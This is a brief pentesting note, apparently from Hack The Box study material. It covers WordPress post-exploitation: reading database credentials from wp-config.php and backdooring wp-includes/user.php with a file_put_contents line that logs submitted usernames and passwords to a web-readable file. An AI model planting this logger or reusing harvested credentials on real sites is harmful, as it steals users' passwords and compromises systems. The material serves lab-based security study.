Things to look for:
- Credentials of the mysql datbases in the __wp-config.php__ in order to later on, make use of that credentials in other users or run the command `mysql -u {USER} -p` and enter the password obtained to list all the data from the database
- Edit the file in `{wp-dir}/wp-includes/user.php` in order to, if a script makes use of an autologin or smth similar, add some extra code to leak the credentials. A practical example could be the machine [Aragog - Writeup](</HTB Machines/WriteUps/Aragog - Writeup.md>). The code to exploit it is `file_put_contents("/var/www/html/dev_wiki/log.txt", $_POST['log'] . " : " . $_POST['pwd'], FILE_APPEND)` in the verification part of the code (Almost at the beggining of the file).
